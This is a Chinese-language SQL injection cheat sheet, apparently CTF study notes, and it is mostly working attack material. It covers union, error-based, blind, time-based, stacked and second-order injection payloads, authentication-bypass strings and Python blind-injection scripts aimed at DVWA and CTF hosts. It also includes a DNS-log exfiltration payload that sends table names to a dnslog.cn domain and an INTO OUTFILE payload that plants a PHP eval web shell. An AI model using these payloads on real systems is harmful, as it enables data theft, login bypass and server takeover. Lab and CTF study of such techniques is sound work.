## 基本函数：
concat()：concat(str1, str2,…)将多个字符串连接成一个字符串

version():数据库版本

user():用户名

database():当前数据库名

```
union select 1,schema_name from information_schema.schemata # 
同样查库名
```

length():返回字符串长度

substr():截取字符串

group_concat():连接一个组的字符串

ord():返回ascii编码样式

ascii():转换为ascii样式

md5():md5加密

floor(x):向下取整

rand():返回0-1随机浮点数

sleep():睡眠时间为指定秒数

left()

if(ture,语句1,语句2)：正确执行语句1，否则执行语句2

`LIMIT 1,1`，从查询结果的第二行开始（跳过第一行），返回一行记录

## 联合注入：
```
?id=1 order by 2#
```

当被过滤可用group by

```
1' or 1=1 order by 3

?id=-1 union select (select group_concat(table_name) from information_schema.tables where table_schema = database()),database()# 注意union之前要为假

?id=-1' union select (select group_concat(column_name)from information_schema.columns where table_name='xxx'),database()

?id=-1 union select 1,group_concat(xxx) from 库名.表名

语句实际：username=1' or 1=1 union select 1,(select group_concat(flag) from flag),3#&password=1
```

## 报错注入：
①MySQL提供了一个 updatexml() 函数，当第二个参数包含特殊符号时会报错，并将第二个参数的内容显示在报错信息中

`?id=1' and updatexml(1, concat(0x7e,(version())),0x7e)`

②利用extractvalue（）对数据进行一个排序，指定第一个参数为null，可以换成1、#或者其他符号，使其报错，并执行第二个参数语句。0x7e表示”-“号

`extractvalue(null,concat(0x7e,(sqli_inject),0x7e))`

`select group_concat(table_name) from information_schema.tables where table_schema=database()`

前面说过extractvalue（）最大返回长度为32，所以可以用limit N，1 一行一行的回显。

`sqli_inject = select table_name from information_schema.tables where table_schema=database() limit 0,1`

③group by：

`select count(*) from information_schema.tables group by concat(database(),floor(rand(0)*2))`

```
当报错开启时：
1' || extractvalue(null,concat(0x7e,(select * from a),0x7e))#
也可能爆出库

爆出表名后可以：
1' || extractvalue(null,concat(0x7e,(select * from (select * from output a join output b) c),0x7e))#
爆出列名
```



## 布尔盲注
```sql
常配合以下函数

substr() / substring():
从字符串中提取前5个字符：(column_name, 1, 5)

left():
从字符串的左侧提取前3个字符：(column_name, 3)

right():
从字符串的右侧提取后4个字符：(column_name, 4)

mid():
从字符串的第2个字符开始提取5个字符：(column_name, 2, 5)

like:
查找以 "ABC" 开头的字符串：LIKE 'ABC%';

rlike (MySQL正则表达式):
查找包含数字的字符串：column_name RLIKE '[0-9]';
RLIKE BINARY:
区别大小写

instr():
查找子字符串 "abc" 在字符串中的位置：INSTR(column_name, 'abc')

IFNULL():
如果值为NULL，则返回默认值：IFNULL(column_name)

exp():
计算e的平方值：exp(2)


需要爆出有几个表

dnslogsqlinj

`?id=1 and substr(database(),1,1)='x'`

`?id=1 and substr((select group_concat(table_name)from information_schema.tables where table_schema=database()),1,1)='f'`

`1' and if((select load_file(concat('\\\\',(select table_name from information_schema.tables where table_schema=database() limit 0,1),'.h6xj05.dnslog.cn\\aaa'))),1,1)--+`


面对dvwa脚本
import string
import urllib.parse
import requests

"select * from users where username='admin' or '1'='1' and password=1"
all = string.ascii_letters + string.digits + '$'
# 字母+数字

#爆库名
def request_Database(url):
    flag = 1
    final = ''
    while flag == 1:
        for i in all:
            cookie={'security':'low', 'PHPSESSID':'1hri9q8o9e0r55d079fssrdp96'}
            payload=f'''1' and substr(database(),1,{len(final+i)})='{final + i}'''

            param = {"id": payload,"Submit": "Submit"}
            req = requests.get(url=url, params=urllib.parse.urlencode(param),cookies=cookie)
            if 'exists' in req.text and 'MISSING' not in req.text:
                final+=i
                break
            if i == '$':
                flag = 0
    print('库名为：',final)
    return final

#爆表名
def request_Table(url,database,table_number):
    flag = 1
    final = ''
    while flag == 1:
        for i in all:
            cookie = {'security': 'low', 'PHPSESSID': '1hri9q8o9e0r55d079fssrdp96'}
            payload = f'''1' and substr((select table_name from information_schema.tables where table_schema='dvwa' limit 1,1),1,{len(final+i)})='{final + i}'''

            param = {"id": payload, "Submit": "Submit"}
            req = requests.get(url=url, params=urllib.parse.urlencode(param), cookies=cookie)
            if 'exists' in req.text and 'MISSING' not in req.text:
                final += i
                break
            if i == '$':
                flag = 0
    print('表名为：', final)


if __name__ == '__main__':
    url = 'http://192.168.93.129/DVWA-master/vulnerabilities/sqli_blind/'
    #database=request_Database(url)
    database='dvwa'
    table_number=2
    request_Table(url,database,table_number)
```

```
import requests
import re
url = "http://node4.anna.nssctf.cn:28057/index.php"
for i in range(50):
    for j in range(40,130):
        data = {
        'id':'1^(ascii(substr((select(flag)from(flag)),'+str(i)+',1))!='+str(j)+')'
        #'id': '1^(ascii(substr(database(),' + str(i) + ',1))!=' + str(j) + ')'# 数据库ctftraini
        }
        respont = requests.post(url,data=data)
        z = re.findall(r'Hello',respont.text,re.S)
        if(z):
            print(chr(j),end="")
            break;

```



## 延时注入

有时可以采用AS别名方法，让查询结果显示在界面上
```
import requests
import sys
 
# 基于时间的盲注，过滤了逗号 ,
sql = "127.0.0.1'+(select case when substr((select flag from flag) from {0} for 1)='{1}' then sleep(5) else 0 end))-- +"
url = 'http://47.106.186.166:31590/'
flag = ''
for i in range(1, 40):
    print('正在猜测：', str(i))
    for ch in range(32, 129):
        if ch == 128:
            sys.exit(0)
        sqli = sql.format(i, chr(ch))
        # print(sqli)
        param=sqli
        
        try:
            html = requests.get(url, params=param, timeout=3)
        except:
            flag += chr(ch)
            print(flag)
            break
```

## 笛卡尔积时间盲注

```
当过滤了各种延时函数，当可以用用笛卡尔积产生延时效果

  
/?id=1 union select * from OPENQUERY([mysql],'select if(ord(mid((select SCHEMA_NAME frOm iNfOrmAtiOn_schEma.SCHEMATA limit 3,1),1,1))=97,(SELECT count(*) FROM information_schema.columns A, information_schema.columns B,information_schema.columns C),0)')


/index.php?id=1'or+elt(1>2,(SELECT+group_concat('1')+FROM+information_schema.columns+A,+information_schema.columns+B))+or'2


SELECT * from database.tableA,database.tableB
```

## 二次注入

```
在插入语句中传入admin'or'   admin'#   admin"#

先登录，后修改密码

系统信任从数据库取出的数据安全
```



## 猜测sql语句

``` 
sql_mode 设置了 PIPES_AS_CONCAT 时，|| 就是字符串连接符，相当于CONCAT() 函数
当 sql_mode 没有设置 PIPES_AS_CONCAT 时 （默认没有设置），|| 就是逻辑或，相当于OR函数


当sql语句可能为 

select $_POST[‘query’] || flag from Flag

①可以传参*,1即可拼接语句成：select *,1 from Flag

②:1;set sql_mode=PIPES_AS_CONCAT;select 1

拼接语句成select 1;set sql_mode=PIPES_AS_CONCAT;select 1||flag from Flag
```



## 堆叠注入（buuctf随便注）
```sql
1;show databases;
1';show databases;#
1';show tables;--+
1'; show columns from 'words';#
1'; show columns from `1919810931114514`;#
	desc tableName;#

1';RENAME TABLE `words` TO `words1`;RENAME TABLE `1919810931114514` TO `words`;ALTER TABLE `words` CHANGE `flag` `id` VARCHAR(100) ;show columns from words;#


handler `1919810931114514` open as `a`;handler `a` read next;

1';desc `1919810931114514`;# 
//查询列名
```

```sql
"PREPARE" 是一种用于准备和执行预编译语句的命令。它通常与 "EXECUTE" 一起使用

①
1';PREPARE hacker from concat('s','elect', ' * from `1919810931114514` ');EXECUTE hacker;#
//字符串拼接

②
1';PREPARE hacker from 0x73656c656374202a2066726f6d20603139313938313039333131313435313460;EXECUTE hacker;#
//select * from `1919810931114514`

③
1';Set @jia = 0x73656c656374202a2066726f6d20603139313938313039333131313435313460;PREPARE hacker from @jia;EXECUTE hacker;#
//@jia是一个定义的变量

④
查看words表结构第一个字段名为`id`我们把words表随便改成words1，然后把1919810931114514表改成words，再把列名flag改成id，就可以达到直接输出flag字段的值的效果：
1'; alter table words rename to words1;alter table `1919810931114514` rename to words;alter table words change flag id varchar(50);#
然后通过
1' or 1 = 1 #
成功获取到flag

⑤
1';HANDLER `1919810931114514` OPEN;HANDLER `1919810931114514` READ FIRST;HANDLER `1919810931114514` CLOSE;
//mysql特有,可以逐行浏览某个表中的数据

例：

打开表：
HANDLER 表名 OPEN ;

查看数据：
HANDLER 表名 READ next;

关闭表：
HANDLER 表名 READ CLOSE;
```

## 文件读写

#### 权限查询
```
cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -

super_priv:若返回Y则说明有超级用户权限
```

```
secure_file_priv变量用于确定从何处读取/写入文件。空值允许我们从整个文件系统读取文件。否则，如果设置了某个目录，我们只能从变量指定的文件夹中读取

cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
```


sql注入进行文件读写

#### 读：
```
union select 1,load_file("\var\www\html\flag")
```

#### 写：
```
union select 1,"<?php @eval($_POST['shell']);?>",3 into outfile '\var\www\html\flag'
```

## 身份验证绕过

```
payload为：

tom' or 1='1
tom' or 1=2#

Executing query: SELECT * FROM logins WHERE username='tom' AND password = '123';

Executing query: SELECT * FROM logins WHERE username='tom' or 1=2#' AND password = '123';

先执行AND，在执行or
```

## Quine注入

使输入的`sql`语句和输出的`sql`语句一致

```
# quine 生成脚本
def quine(data, debug=True):
    if debug: print(data)
    data = data.replace('!!',"REPLACE(REPLACE(!!,CHAR(34),CHAR(39)),CHAR(33),!!)")
    blob = data.replace('!!','"!"').replace("'",'"')
    data = data.replace('!!',"'"+blob+"'")
    if debug: print(data)
    return data
"""
!!填充的东西执行完之后和data一样
"""
data="'/**/union/**/select(!!)#"
quine(data)

password=1'/**/union/**/select(REPLACE(REPLACE('"/**/union/**/select(REPLACE(REPLACE("!",CHAR(34),CHAR(39)),CHAR(33),"!"))#',CHAR(34),CHAR(39)),CHAR(33),'"/**/union/**/select(REPLACE(REPLACE("!",CHAR(34),CHAR(39)),CHAR(33),"!"))#'))#
```

https://ph0ebus.cn/post/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BQuine%E6%B3%A8%E5%85%A5.html
